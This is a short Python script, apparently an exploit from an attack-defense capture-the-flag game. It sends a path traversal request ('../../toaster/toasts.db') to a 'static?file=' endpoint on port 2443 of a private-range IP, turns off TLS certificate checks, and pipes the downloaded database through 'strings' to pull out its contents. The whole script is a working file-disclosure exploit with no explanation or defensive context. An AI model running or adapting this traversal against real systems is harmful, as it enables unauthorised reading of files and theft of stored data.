import sys, requests
from subprocess import Popen, PIPE

ip = '10.60.30.100'
if len(sys.argv) > 1:
    ip = sys.argv[1]

url = "https://{}:2443/static?file=../../toaster/toasts.db".format(ip)
proc = Popen(["strings"], stdin=PIPE)
response = requests.get(url, stream=True, verify=False)
for chunk in response.iter_content(chunk_size=512):
    if chunk:  # filter out keep-alive new chunks
        proc.stdin.write(chunk)
proc.stdin.close()
proc.wait()
